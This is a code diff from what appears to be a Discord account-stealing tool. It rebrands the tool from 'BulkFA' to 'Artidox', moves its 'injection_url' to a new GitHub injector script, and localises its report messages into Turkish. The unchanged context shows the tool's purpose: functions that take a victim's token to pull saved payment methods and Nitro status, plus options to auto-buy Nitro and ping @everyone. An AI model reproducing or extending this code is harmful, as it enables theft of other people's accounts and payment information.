@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'BulkFA', 
-  embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+  embed_name: 'Artidox', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/993472876760018974/997488932063297616/09dd59f039d5be69b4907d60e1840dcc.jpg',
   embed_color: 000000, 
-  injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
+  injection_url: 'https://raw.githubusercontent.com/Artidox/injector/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
@@ -469,21 +469,21 @@ const fetchBilling = async (token) => {
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (!data) return '❌';
+  if (!data) return 'Kayıtlı olan ödeme yöntemi yok.';
   let billing = '';
   data.forEach((x) => {
     if (!x.invalid) {
       switch (x.type) {
         case 1:
-          billing += '💳 ';
+          billing += ' <:kart:997487319076573235> ';
           break;
         case 2:
-          billing += '<:paypal:951139189389410365> ';
+          billing += ' <:paypal:997545973523959968> ';
           break;
       }
     }
   });
-  if (!billing) billing = '❌';
+  if (!billing) billing = 'Kayıtlı olan ödeme yöntemi yok.';
   return billing;
 };
 
@@ -518,9 +518,9 @@ const getNitro = (flags) => {
     case 0:
       return '';
     case 1:
-      return '<:nitro:892130462024224838> ';
+      return ' <:4872badgenitroclassic:991719224064081980> ';
     case 2:
-      return '<:nitro:892130462024224838> ';
+      return ' <:4872badgenitroclassic:991719224064081980> ';
     default:
       return '';
   }
